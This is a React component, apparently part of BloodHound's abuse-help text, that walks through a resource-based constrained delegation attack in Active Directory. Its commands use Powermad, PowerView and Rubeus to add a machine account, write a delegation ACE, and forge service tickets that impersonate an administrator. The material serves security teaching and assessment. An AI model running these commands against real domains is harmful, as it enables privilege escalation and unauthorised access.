// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does
                not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new
                attacker-controlled computer account:
            </Typography>
            <Typography component={'pre'}>
                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!'
                -AsPlainText -Force)"
            </Typography>
            <Typography variant='body2'>
                PowerView can be used to then retrieve the security identifier (SID) of the newly created computer
                account:
            </Typography>
            <Typography component={'pre'}>
                '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
            </Typography>
            <Typography variant='body2'>
                We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the
                binary bytes for the new DACL/ACE:
            </Typography>
            <Typography component={'pre'}>
                '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
                "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' + '$SDBytes = New-Object byte[]
                ($SD.BinaryLength)\n' + '$SD.GetBinaryForm($SDBytes, 0)'
            </Typography>
            <Typography variant='body2'>
                Next, we need to set this newly created security descriptor in the
                msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using
                PowerView in this case:
            </Typography>
            <Typography component={'pre'}>
                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set
                @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125;"
            </Typography>
            <Typography variant='body2'>
                We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
            </Typography>
            <Typography component={'pre'}>'Rubeus.exe hash /password:Summer2018!'</Typography>
            <Typography variant='body2'>
                And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want
                to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us
                access to the file system of the TARGETCOMPUTER:
            </Typography>
            <Typography component={'pre'}>
                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin
                /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
            </Typography>
        </>
    );
};

export default WindowsAbuse;
